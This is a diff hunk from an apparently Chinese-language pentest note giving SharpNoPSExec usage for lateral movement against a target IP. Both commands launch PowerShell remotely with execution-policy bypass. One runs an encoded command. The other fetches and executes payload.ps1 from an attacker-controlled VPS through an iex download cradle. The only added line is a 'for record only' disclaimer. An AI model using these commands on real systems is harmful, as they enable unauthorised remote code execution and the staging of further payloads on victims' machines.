@@ -10,3 +10,4 @@
 SharpNoPSExec.exe --target=192.168.0.2 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ZQBjAGgAbwAgAEcAbwBkACAAQgBsAGUAcwBzACAAWQBvAHUAIQA="
 SharpNoPSExec.exe --target=192.168.0.2 --payload="c:\windows\system32\cmd.exe /c powershell -nop -c iex(New-Object Net.WebClient).DownloadString('http://你的vps:80/payload.ps1')"
 ```
+- #仅做记录用，侵删
